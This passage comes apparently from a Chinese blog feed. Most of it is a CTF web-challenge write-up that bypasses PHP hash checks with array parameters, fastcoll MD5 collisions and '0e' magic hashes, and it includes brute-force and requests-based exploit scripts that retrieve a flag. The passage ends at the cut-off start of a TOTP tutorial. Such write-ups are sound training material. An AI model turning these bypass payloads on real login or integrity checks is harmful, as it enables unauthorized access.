fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$val5</span> == <span class="variable">$val6</span> || <span class="variable">$val5</span> == <span class="variable">$val7</span> || <span class="variable">$val6</span> == <span class="variable">$val7</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;val5 OR val6 OR val7 no no no&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$val5</span>) !== <span class="title function_ invoke__">md5</span>(<span class="variable">$val6</span>) || <span class="title function_ invoke__">md5</span>(<span class="variable">$val6</span>) !== <span class="title function_ invoke__">md5</span>(<span class="variable">$val7</span>) || <span class="title function_ invoke__">md5</span>(<span class="variable">$val5</span>) !== <span class="title function_ invoke__">md5</span>(<span class="variable">$val7</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 3 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> !(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;come on!&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$n</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(<span class="title function_ invoke__">ctype_alnum</span>(<span class="variable">$a</span>)) || (<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &gt; <span class="number">5</span>)  || !(<span class="title function_ invoke__">ctype_alnum</span>(<span class="variable">$b</span>)) || (<span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>) &gt; <span class="number">6</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a OR b fail!&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="title function_ invoke__">strlen</span>(<span class="variable">$m</span>) &gt; <span class="number">1</span>) || (<span class="title function_ invoke__">strlen</span>(<span class="variable">$n</span>) &gt; <span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;m OR n fail&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$val8</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$val9</span> = <span class="title function_ invoke__">strtr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>), <span class="variable">$m</span>, <span class="variable">$n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;val8 : <span class="subst">$val8</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;val9 : <span class="subst">$val9</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$val8</span> == <span class="variable">$val9</span>) &amp;&amp; !(<span class="variable">$a</span> === <span class="variable">$b</span>) &amp;&amp; (<span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>) === <span class="number">5</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nice,good job,give you flag:&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/var/www/html/flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>绕过逻辑</p>
<h4 id="前四个IF"><a href="#前四个IF" class="headerlink" title="前四个IF"></a>前四个IF</h4><ul>
<li><p>条件 1：if( $val1 &#x3D;&#x3D; $val2 ) → 触发 die</p>
<ul>
<li>在 PHP 中，两个不同内容的数组使用 &#x3D;&#x3D; 比较时结果是 false，即使内容不同。</li>
<li>所以：<code>[1] == [2] → false</code></li>
</ul>
</li>
<li><p>条件 2：if( md5($val1) !&#x3D; md5($val2) ) → 要通过必须 md5($val1) &#x3D;&#x3D; md5($val2)</p>
<ul>
<li>PHP 无法对数组进行 md5() 计算，会发出警告并返回 NULL。</li>
<li>所以:<code>NULL != NULL → false</code></li>
</ul>
</li>
<li><p>条件 3：if( $val3 &#x3D;&#x3D; $val4 )</p>
<ul>
<li>同 条件 1</li>
</ul>
</li>
<li><p>条件 4：if ( md5($val3) !&#x3D;&#x3D; md5($val4))</p>
<ul>
<li>!&#x3D;&#x3D; 是 强比较（类型 + 值）</li>
<li>因为两个 NULL 类型相同，值也相同，所以 !&#x3D;&#x3D; 为 false</li>
</ul>
</li>
</ul>
<h4 id="五六个IF"><a href="#五六个IF" class="headerlink" title="五六个IF"></a>五六个IF</h4><ul>
<li>分别需要传入三个值</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$val5</span> = (<span class="keyword">string</span>)@<span class="variable">$_POST</span>[<span class="string">&#x27;val5&#x27;</span>];</span><br><span class="line"><span class="variable">$val6</span> = (<span class="keyword">string</span>)@<span class="variable">$_POST</span>[<span class="string">&#x27;val6&#x27;</span>];</span><br><span class="line"><span class="variable">$val7</span> = (<span class="keyword">string</span>)@<span class="variable">$_POST</span>[<span class="string">&#x27;val7&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>传入的内容会被转换为字符串</p>
<p>然后</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="variable">$val5</span> == <span class="variable">$val6</span> || <span class="variable">$val5</span> == <span class="variable">$val7</span> || <span class="variable">$val6</span> == <span class="variable">$val7</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;val5 OR val6 OR val7 no no no&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$val5</span>) !== <span class="title function_ invoke__">md5</span>(<span class="variable">$val6</span>) || <span class="title function_ invoke__">md5</span>(<span class="variable">$val6</span>) !== <span class="title function_ invoke__">md5</span>(<span class="variable">$val7</span>) || <span class="title function_ invoke__">md5</span>(<span class="variable">$val5</span>) !== <span class="title function_ invoke__">md5</span>(<span class="variable">$val7</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 3 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>val5 、 val6、val7 三个内容不能相同，但是三个的MD5值必须严格相同（!&#x3D;&#x3D; ） 内容和类型都一样</p>
<p>所以必须构造三个MD5相同但内容不同的数据</p>
<p>使用两个工具</p>
<ul>
<li>fastcoll<ul>
<li>FastColl 是一个专门用于生成MD5碰撞的著名工具，由Marc Stevens（埃因霍芬理工大学）开发。它可以快速生成两个具有相同MD5哈希值但内容不同的文件。</li>
</ul>
</li>
<li>tail<ul>
<li>文件尾部操作工具，拼接文件</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">E:\Dfile\CTF\Web\MD5&gt;fastcoll_v1.0.0.5.exe -p jlzj1 -o jlzj00 jlzj01</span><br><span class="line">MD5 collision generator v1.5</span><br><span class="line">by Marc Stevens (http://www.win.tue.nl/hashclash/)</span><br><span class="line"></span><br><span class="line">Using output filenames: <span class="string">&#x27;jlzj00&#x27;</span> and <span class="string">&#x27;jlzj01&#x27;</span></span><br><span class="line">Using prefixfile: <span class="string">&#x27;jlzj1&#x27;</span></span><br><span class="line">Using initial value: f0097a88e3a599391778a4647c20406c</span><br><span class="line"></span><br><span class="line">Generating first block: ...</span><br><span class="line">Generating second block: S00...........</span><br><span class="line">Running time: 1.447 s</span><br><span class="line"></span><br><span class="line">E:\Dfile\CTF\Web\MD5&gt;tail.exe -c 128 jlzj00 &gt; a</span><br><span class="line"></span><br><span class="line">E:\Dfile\CTF\Web\MD5&gt;tail.exe -c 128 jlzj01 &gt; b</span><br><span class="line"></span><br><span class="line">E:\Dfile\CTF\Web\MD5&gt;<span class="built_in">type</span> jlzj0 a &gt; jlzj10</span><br><span class="line"></span><br><span class="line">jlzj0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E:\Dfile\CTF\Web\MD5&gt;<span class="built_in">type</span> jlzj0 b &gt; jlzj11</span><br><span class="line"></span><br><span class="line">jlzj0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b</span><br></pre></td></tr></table></figure>

<p>这样成功构造了四个文件</p>
<p>检查文件的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_file_differences</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;详细检查四个文件的差异&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    files = [<span class="string">&quot;jlzj00&quot;</span>, <span class="string">&quot;jlzj01&quot;</span>, <span class="string">&quot;jlzj10&quot;</span>, <span class="string">&quot;jlzj11&quot;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;🔍 详细文件检查...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 读取所有文件内容</span></span><br><span class="line">    contents = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            contents[file] = f.read()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查文件内容是否完全相同</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件内容比较:&quot;</span>)</span><br><span class="line">    identical_pairs = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i, file1 <span class="keyword">in</span> <span class="built_in">enumerate</span>(files):</span><br><span class="line">        <span class="keyword">for</span> j, file2 <span class="keyword">in</span> <span class="built_in">enumerate</span>(files):</span><br><span class="line">            <span class="keyword">if</span> i &lt; j:  <span class="comment"># 避免重复比较</span></span><br><span class="line">                <span class="keyword">if</span> contents[file1] == contents[file2]:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;❌ <span class="subst">&#123;file1&#125;</span> 和 <span class="subst">&#123;file2&#125;</span> 内容完全相同&quot;</span>)</span><br><span class="line">                    identical_pairs.append((file1, file2))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;✅ <span class="subst">&#123;file1&#125;</span> 和 <span class="subst">&#123;file2&#125;</span> 内容不同&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查文件大小</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n📊 文件大小:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> file, content <span class="keyword">in</span> contents.items():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;file&#125;</span>: <span class="subst">&#123;<span class="built_in">len</span>(content)&#125;</span> 字节&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查MD5</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n🔑 MD5值:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> file, content <span class="keyword">in</span> contents.items():</span><br><span class="line">        md5_val = hashlib.md5(content).hexdigest()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;file&#125;</span>: <span class="subst">&#123;md5_val&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> identical_pairs:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;⚠️ 发现 <span class="subst">&#123;<span class="built_in">len</span>(identical_pairs)&#125;</span> 对相同文件:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> pair <span class="keyword">in</span> identical_pairs:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  - <span class="subst">&#123;pair[<span class="number">0</span>]&#125;</span> 和 <span class="subst">&#123;pair[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n请选择三个不同的文件!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;🎉 所有文件内容都不同!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> identical_pairs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_best_combination</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;找到三个完全不同的文件组合&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    files = [<span class="string">&quot;jlzj00&quot;</span>, <span class="string">&quot;jlzj01&quot;</span>, <span class="string">&quot;jlzj10&quot;</span>, <span class="string">&quot;jlzj11&quot;</span>]</span><br><span class="line">    contents = &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            contents[file] = f.read()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 尝试所有可能的组合</span></span><br><span class="line">    combinations = [</span><br><span class="line">        [<span class="string">&quot;jlzj00&quot;</span>, <span class="string">&quot;jlzj01&quot;</span>, <span class="string">&quot;jlzj10&quot;</span>],</span><br><span class="line">        [<span class="string">&quot;jlzj00&quot;</span>, <span class="string">&quot;jlzj01&quot;</span>, <span class="string">&quot;jlzj11&quot;</span>], </span><br><span class="line">        [<span class="string">&quot;jlzj00&quot;</span>, <span class="string">&quot;jlzj10&quot;</span>, <span class="string">&quot;jlzj11&quot;</span>],</span><br><span class="line">        [<span class="string">&quot;jlzj01&quot;</span>, <span class="string">&quot;jlzj10&quot;</span>, <span class="string">&quot;jlzj11&quot;</span>]</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n🔍 寻找最佳文件组合...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    </span><br><span class="line">    valid_combinations = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> combo <span class="keyword">in</span> combinations:</span><br><span class="line">        f1, f2, f3 = combo</span><br><span class="line">        c1, c2, c3 = contents[f1], contents[f2], contents[f3]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查是否所有文件都不同</span></span><br><span class="line">        <span class="keyword">if</span> c1 != c2 <span class="keyword">and</span> c1 != c3 <span class="keyword">and</span> c2 != c3:</span><br><span class="line">            valid_combinations.append(combo)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;✅ 有效组合: <span class="subst">&#123;combo&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;❌ 无效组合: <span class="subst">&#123;combo&#125;</span> (有重复文件)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> valid_combinations</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行检查</span></span><br><span class="line">identical_pairs = check_file_differences()</span><br><span class="line">valid_combos = find_best_combination()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> valid_combos:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n🎯 推荐使用组合: <span class="subst">&#123;valid_combos[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n❌ 没有找到三个完全不同的文件组合&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>检查结果：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">└─<span class="variable">$</span> python check5.py</span><br><span class="line">🔍 详细文件检查...</span><br><span class="line">==================================================</span><br><span class="line">文件内容比较:</span><br><span class="line">✅ jlzj00 和 jlzj01 内容不同</span><br><span class="line">✅ jlzj00 和 jlzj10 内容不同</span><br><span class="line">✅ jlzj00 和 jlzj11 内容不同</span><br><span class="line">✅ jlzj01 和 jlzj10 内容不同</span><br><span class="line">✅ jlzj01 和 jlzj11 内容不同</span><br><span class="line">✅ jlzj10 和 jlzj11 内容不同</span><br><span class="line"></span><br><span class="line">📊 文件大小:</span><br><span class="line">jlzj00: <span class="number">256</span> 字节</span><br><span class="line">jlzj01: <span class="number">256</span> 字节</span><br><span class="line">jlzj10: <span class="number">256</span> 字节</span><br><span class="line">jlzj11: <span class="number">256</span> 字节</span><br><span class="line"></span><br><span class="line">🔑 MD5值:</span><br><span class="line">jlzj00: <span class="number">5</span>bd1867197b35c25edd5e04c6de91163</span><br><span class="line">jlzj01: <span class="number">5</span>bd1867197b35c25edd5e04c6de91163</span><br><span class="line">jlzj10: <span class="number">5</span>bd1867197b35c25edd5e04c6de91163</span><br><span class="line">jlzj11: <span class="number">5</span>bd1867197b35c25edd5e04c6de91163</span><br></pre></td></tr></table></figure>

<p>这样就能绕过了</p>
<p>传数据的方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jlzj00&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    val5_content = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jlzj01&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    val6_content = f.read()  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jlzj10&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    val7_content = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST数据 - 文件内容作为字符串</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;val5&#x27;</span>: val5_content,</span><br><span class="line">    <span class="string">&#x27;val6&#x27;</span>: val6_content,</span><br><span class="line">    <span class="string">&#x27;val7&#x27;</span>: val7_content</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后的绕过</p>
<p>借助大佬的攻击脚本得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_a</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;寻找满足条件的$a：MD5以&#x27;0e&#x27;开头，后面全是数字&quot;&quot;&quot;</span></span><br><span class="line">    chars = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 遍历所有5位字母数字组合</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> chars:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> chars:</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> chars:</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> chars:</span><br><span class="line">                        payload = (i + j + m + n + k)</span><br><span class="line">                        md5_hash = hashlib.md5(payload.encode()).hexdigest()</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment"># 检查条件：以&quot;0e&quot;开头，后面全是数字</span></span><br><span class="line">                        <span class="keyword">if</span> md5_hash.startswith(<span class="string">&quot;0e&quot;</span>) <span class="keyword">and</span> md5_hash[<span class="number">2</span>:].isdigit():</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;找到$a: <span class="subst">&#123;payload&#125;</span> -&gt; <span class="subst">&#123;md5_hash&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="keyword">return</span> payload, md5_hash</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_b</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;寻找满足条件的$b：MD5第二位是&#x27;e&#x27;，后面全是数字&quot;&quot;&quot;</span></span><br><span class="line">    chars = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> chars:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> chars:</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> chars:</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> chars:</span><br><span class="line">                        payload = (i + j + m + n + k)</span><br><span class="line">                        md5_hash = hashlib.md5(payload.encode()).hexdigest()</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment"># 检查条件：第二位是&#x27;e&#x27;，后面全是数字</span></span><br><span class="line">                        <span class="keyword">if</span> md5_hash[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span> <span class="keyword">and</span> md5_hash[<span class="number">2</span>:].isdigit():</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;找到$b: <span class="subst">&#123;payload&#125;</span> -&gt; <span class="subst">&#123;md5_hash&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="keyword">return</span> payload, md5_hash</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    a_value, a_md5 = find_a()</span><br><span class="line">    b_value, b_md5 = find_b()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">└─<span class="variable">$</span> python wdf.py</span><br><span class="line">b<span class="string">&#x27;byGcY&#x27;</span>-&gt;<span class="number">0</span>e591948146966052067035298880982</span><br><span class="line">b<span class="string">&#x27;e2P2Z&#x27;</span>-&gt;<span class="number">3</span>e297891816980937234055076451742</span><br></pre></td></tr></table></figure>

<p>至此，可以构造完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit_with_post_data</span>():</span><br><span class="line">    url = <span class="string">&quot;http://you_ip/&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># GET参数</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;val1[]&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;val2[]&#x27;</span>: <span class="string">&#x27;2&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;val3[]&#x27;</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;val4[]&#x27;</span>: <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;m&#x27;</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 读取文件内容作为字符串发送</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jlzj00&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        val5_content = f.read()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jlzj01&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        val6_content = f.read()  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jlzj10&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        val7_content = f.read()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># POST数据 - 文件内容作为字符串</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;val5&#x27;</span>: val5_content,</span><br><span class="line">        <span class="string">&#x27;val6&#x27;</span>: val6_content,</span><br><span class="line">        <span class="string">&#x27;val7&#x27;</span>: val7_content,</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;byGcY&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;e2P2Z&#x27;</span> <span class="comment"># </span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;🚀 使用POST字符串发送文件内容...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, params=params, data=data)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;📋 响应状态码:&quot;</span>, response.status_code)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;📋 响应内容:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.html&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(response.text)</span><br><span class="line"> </span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 请求失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行攻击</span></span><br><span class="line">exploit_with_post_data()</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&amp;nbsp;you&amp;nbsp;flag:<span class="string">&quot;&lt;/span&gt;&lt;span style=&quot;</span>color: <span class="comment">#007700&quot;&gt;;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;echo&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;file_get_contents&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: #DD0000&quot;&gt;&#x27;/var/www/html/flag.php&#x27;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;);&lt;br /&gt;&#125;&lt;/span&gt;</span></span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;</span><br><span class="line">&lt;p&gt;val8 : <span class="number">0</span>e591948146966052067035298880982&lt;/p&gt;</span><br><span class="line">&lt;p&gt;val9 : <span class="number">0</span>e297891816980907204055076451742&lt;/p&gt;</span><br><span class="line">nice,good job,give you flag:&lt;?php</span><br><span class="line"><span class="comment">#$flag=&quot;flag&#123;0800fc577294c34e0b28ad2839435945&#125;&quot;;</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-10-25-Python实现TOTP</title>
    <url>/2025/10/25/2025-10-25-Python%E5%AE%9E%E7%8E%B0TOTP/</url>
    <content><![CDATA[<h3 id="用-Python-实现-TOTP（基于时间的一次性密码）"><a href="#用-Python-实现-TOTP（基于时间的一次性密码）" class="headerlink" title="用 Python 实现 TOTP（基于时间的一次性密码）"></a>用 Python 实现 TOTP（基于时间的一次性密码）</h3><p>一、什么是 TOTP？TOTP 是 基于时间的一次性密码，其核心思想是：</p>
<ul>
<li>共享密钥（Shared Secret）：用户与服务端共享一个 Base32 编码的密钥。</li>
<li>当前时间：以 30 秒为一个时间步（interval）。</li>
